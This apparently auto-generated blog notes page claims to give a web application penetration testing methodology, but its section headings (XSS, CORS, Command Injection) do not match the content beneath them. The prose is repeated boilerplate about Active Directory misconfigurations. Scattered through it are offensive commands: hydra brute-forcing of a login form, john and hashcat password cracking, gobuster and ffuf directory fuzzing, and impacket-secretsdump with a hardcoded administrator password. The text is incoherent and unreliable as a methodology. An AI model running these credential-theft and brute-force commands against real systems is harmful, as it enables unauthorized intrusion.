---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "linux, networking, persistence"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-109.html"
URL_IMAGES: ""
Date: "2026-02-16"
Tags: "Linux, Networking, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-109"
Permalink: "/notes/note-web-application-penetration-testing-meth-109.html"
BtnLabel: "Read Notes"
Pick: 0
---
## sqlmap

### Apache

- `Resource-Based Constrained Delegation`
- `Pass the Hash`
- `msfvenom`

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

```bash
gobuster dir -u http://10.18.114.71/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.164.169 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

## CORS Misconfiguration

### Unconstrained Delegation

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.184.238
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

## XSS

### Subdomain Takeover

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

> **Note:** CSRF was identified as the primary attack vector in this scenario.

> **Note:** Weak Service Permissions was identified as the primary attack vector in this scenario.

## msfvenom

### Command Injection

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.28.146.114/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.36.145.204/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.172.253 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.163.152
```
